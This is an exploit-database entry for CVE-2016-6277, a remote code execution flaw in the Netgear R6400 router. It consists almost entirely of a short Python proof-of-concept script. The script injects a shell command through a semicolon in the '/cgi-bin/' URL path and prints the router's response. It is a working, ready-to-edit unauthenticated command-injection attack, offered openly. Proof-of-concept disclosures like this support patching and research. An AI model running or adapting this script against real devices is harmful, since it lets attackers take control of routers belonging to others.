# Exploit Title: Netgear R6400 - Remote Code Execution
# Date: 2019-12-14
# Exploit Author: Kevin Randall
# CVE: CVE-2016-6277
# Vendor Homepage: https://www.netgear.com/
# Category: Hardware
# Version: V1.0.7.2_1.1.93

# PoC

#!/usr/bin/python

import urllib2

IP_ADDR = "192.168.1.1"
PROTOCOL = "http://"
DIRECTORY = "/cgi-bin/;"
CMD = "date"
FULL_URL = PROTOCOL + IP_ADDR + DIRECTORY + CMD

req = urllib2.Request(url = FULL_URL)
response = urllib2.urlopen(req)
commandoutput = response.read()
spl_word =  "}"
formattedoutput = commandoutput
result = formattedoutput.rpartition(spl_word)[2]
print result